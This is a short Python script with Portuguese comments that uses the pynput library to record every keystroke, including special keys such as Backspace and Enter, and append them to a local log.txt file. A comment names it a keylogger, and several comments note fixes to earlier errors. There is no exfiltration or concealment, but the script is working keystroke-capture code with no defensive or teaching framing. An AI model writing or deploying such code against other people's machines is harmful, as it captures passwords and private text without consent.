from pynput import keyboard

# Usamos 'Key' com K maiúsculo, conforme o erro sugeriu.
# As teclas a serem ignoradas (Control, Alt, Shift, etc.)
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock, # Corrigido 'cap_lock' para 'caps_lock'
    keyboard.Key.cmd
}

def on_press(key):
    """Lida com o evento de pressionar uma tecla."""
    try:
        # Tenta escrever a representação do caractere (teclas normais)
        char = key.char
        if char is not None:
            with open("log.txt", "a", encoding="utf-8") as f:
                f.write(char)

    except AttributeError:
        # Lida com teclas especiais (Space, Enter, Backspace, etc.)
        
        # Ignora as teclas de modificação na lista IGNORAR
        if key in IGNORAR:
            return 
        
        # Mapeia teclas especiais para caracteres legíveis
        elif key == keyboard.Key.space:
            texto = " "
        elif key == keyboard.Key.enter:
            texto = "\n"
        elif key == keyboard.Key.tab:
            texto = "\t"
        elif key == keyboard.Key.backspace:
            # Em um keylogger, geralmente se registra apenas o evento. 
            # Se for para simular a exclusão, " [DEL] " é mais informativo que um espaço.
            texto = " [BACKSPACE] " 
        elif key == keyboard.Key.esc:
            texto = " [ESC] "
        else:
            # Para qualquer outra tecla especial (Ex: Key.f1, Key.delete)
            texto = f" [{str(key).replace('Key.', '').upper()}] "
        
        # Escreve o texto da tecla especial no arquivo
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(texto)

# Configura e inicia o listener do teclado
# É 'on_press=on_press', não 'open_press'
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
